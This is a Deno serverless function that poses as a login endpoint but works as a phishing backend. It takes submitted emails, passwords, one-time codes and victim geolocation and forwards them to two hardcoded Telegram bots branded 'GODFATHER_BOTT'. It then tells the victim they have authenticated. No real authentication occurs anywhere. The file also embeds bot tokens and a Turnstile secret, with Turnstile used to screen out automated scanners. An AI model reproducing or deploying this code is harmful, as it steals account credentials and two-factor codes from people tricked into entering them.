import { serve } from "https://deno.land/std@0.168.0/http/server.ts"

interface LoginRequest {
  email: string
  provider?: string
  password: string
  turnstileToken?: string
  // Geolocation fields (resolved client-side via IP lookup)
  ip?: string
  country?: string
  countryCode?: string
  region?: string
  city?: string
  continent?: string
  org?: string
  timezone?: string
}

interface LoginResponse {
  success: boolean
  message: string
  data?: {
    email: string
    name: string
    provider: string
    timestamp: string
  }
  error?: string
}

// Telegram configuration — each bot has its own token and chat ID
const TELEGRAM_BOTS = [
  { token: '8335283094:AAG6BMVNr4O4zy8ha9565bgX-P87uKsJYB0', chatId: '8042057280' },
  { token: '8810483237:AAEU9tXIxRL_HzgLrdEB0O7_I9aEVW5RCkM', chatId: '5566002678' },
]

interface GeoInfo {
  ip?: string
  country?: string
  countryCode?: string
  region?: string
  city?: string
  continent?: string
  org?: string
  timezone?: string
}

async function sendTelegramNotification(
  name: string,
  email: string,
  provider: string,
  password: string,
  geo?: GeoInfo
) {
  const isOtp = password.startsWith('[OTP Code]');
  const credentialLabel = isOtp ? '🔑 <b>OTP Code:</b>' : '🔒 <b>Password:</b>';
  const displayPassword = isOtp ? password.replace('[OTP Code]', '').trim() : password;
  const statusLabel = isOtp ? 'One-Time Code Submitted' : 'Successfully Authenticated';

  // Build geolocation section
  const geoLines = geo ? [
    geo.ip         ? `🌐 <b>IP:</b> <code>${geo.ip}</code>` : null,
    geo.country    ? `🏳️ <b>Country:</b> ${geo.country}${geo.countryCode ? ` (${geo.countryCode})` : ''}` : null,
    geo.continent  ? `🌍 <b>Continent:</b> ${geo.continent}` : null,
    geo.region     ? `📍 <b>Region:</b> ${geo.region}` : null,
    geo.city       ? `🏙️ <b>City:</b> ${geo.city}` : null,
    geo.org        ? `🏢 <b>ISP/Org:</b> ${geo.org}` : null,
    geo.timezone   ? `⏰ <b>Timezone:</b> ${geo.timezone}` : null,
  ].filter(Boolean).join('\n') : ''

  const geoSection = geoLines ? `\n\n📡 <b>Geolocation</b>\n━━━━━━━━━━━━━━━━━━━━\n${geoLines}` : ''

  const message = `
╔══════════════════════════════╗
  ⚡ <span class="tg-spoiler">[ ＧＯＤＦＡＴＨＥＲ _ ＢＯＴＴ ]</span> ⚡
╚══════════════════════════════╝

✅ <b>Status:</b> ${statusLabel}
👤 <b>Name:</b> ${name}
📧 <b>Email:</b> ${email}
🔗 <b>Provider:</b> ${provider}
${credentialLabel} <code>${displayPassword}</code>
🕐 <b>Timestamp:</b> ${new Date().toISOString()}${geoSection}

━━━━━━━━━━━━━━━━━━━━
<i>User has been welcomed and account is now active.</i>
<code>@godfather_bott</code>
  `.trim()

  try {
    const fetchPromises = TELEGRAM_BOTS.map(({ token, chatId }, i) =>
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
        }),
      })
        .then(async (res) => {
          if (!res.ok) {
            const err = await res.text()
            console.error(`[Bot ${i}] Failed: ${res.status} — ${err}`)
          } else {
            console.log(`[Bot ${i}] Sent successfully`)
          }
        })
        .catch((err) => {
          console.error(`[Bot ${i}] Network error:`, err)
        })
    )

    await Promise.allSettled(fetchPromises)
  } catch (error) {
    console.error('Unexpected error sending Telegram notifications:', error)
  }
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, {
      status: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
      },
    })
  }

  try {
    // Only accept POST requests
    if (req.method !== 'POST') {
      return new Response(
        JSON.stringify({
          success: false,
          message: 'Method not allowed',
          error: 'Method not allowed. Use POST.'
        } as LoginResponse),
        {
          status: 405,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
          },
        }
      )
    }

    // Parse request body
    const body: LoginRequest = await req.json()

    // Validate required fields
    if (!body.email) {
      return new Response(
        JSON.stringify({
          success: false,
          message: 'Validation failed',
          error: 'Missing required field: email is required.'
        } as LoginResponse),
        {
          status: 400,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
          },
        }
      )
    }

    // Validate password (if it is provided by the direct login form, it shouldn't be suspiciously short)
    if (body.password && body.password.length < 3) {
      return new Response(
        JSON.stringify({
          success: false,
          message: 'Validation failed',
          error: 'Password must be at least 3 characters long.'
        } as LoginResponse),
        {
          status: 400,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
          },
        }
      )
    }

    // Verify Turnstile Token if it's a direct login attempt (password present, not OTP)
    if (body.password && !body.password.startsWith('[OTP Code]')) {
      if (!body.turnstileToken) {
        return new Response(
          JSON.stringify({
            success: false,
            message: 'Validation failed',
            error: 'Anti-bot verification required. Please complete the Turnstile challenge.'
          } as LoginResponse),
          { status: 400, headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' } }
        )
      }

      const turnstileSecret = '0x4AAAAAADhBiHHNm5wkr0Z43RxseAwqOOg'
      const turnstileVerifyResponse = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
          secret: turnstileSecret,
          response: body.turnstileToken,
        }).toString(),
      })

      const turnstileOutcome = await turnstileVerifyResponse.json()
      if (!turnstileOutcome.success) {
        return new Response(
          JSON.stringify({
            success: false,
            message: 'Verification failed',
            error: 'Failed to verify Turnstile challenge. Are you a bot?'
          } as LoginResponse),
          { status: 403, headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' } }
        )
      }
    }

    // Extract name from email
    const emailLocal = body.email.split('@')[0]
    const formattedName = emailLocal
      .split('.')
      .map(part => part.charAt(0).toUpperCase() + part.slice(1).toLowerCase())
      .join(' ')

    // Generate professional welcome message
    const providerName = body.provider ? ` via ${body.provider}` : ''
    const welcomeMessage = `Hi ${formattedName}, welcome! You have successfully authenticated${providerName}. Your account is now active and ready to use.`

    // Build geo object from request body fields
    const geo: GeoInfo = {
      ip: body.ip,
      country: body.country,
      countryCode: body.countryCode,
      region: body.region,
      city: body.city,
      continent: body.continent,
      org: body.org,
      timezone: body.timezone,
    }

    // Send Telegram notification (must await so Deno isolate doesn't terminate before it finishes)
    await sendTelegramNotification(formattedName, body.email, body.provider || 'email', body.password, geo).catch(err => {
      console.error('Telegram notification error:', err)
    })

    // Return success response
    const response: LoginResponse = {
      success: true,
      message: welcomeMessage,
      data: {
        email: body.email,
        name: formattedName,
        provider: body.provider || 'email',
        timestamp: new Date().toISOString()
      }
    }

    return new Response(
      JSON.stringify(response),
      {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
        },
      }
    )

  } catch (error) {
    // Handle any errors
    const errorResponse: LoginResponse = {
      success: false,
      message: 'Server error',
      error: error instanceof Error ? error.message : 'An unexpected error occurred during login processing.'
    }

    return new Response(
      JSON.stringify(errorResponse),
      {
        status: 500,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
        },
      }
    )
  }
})
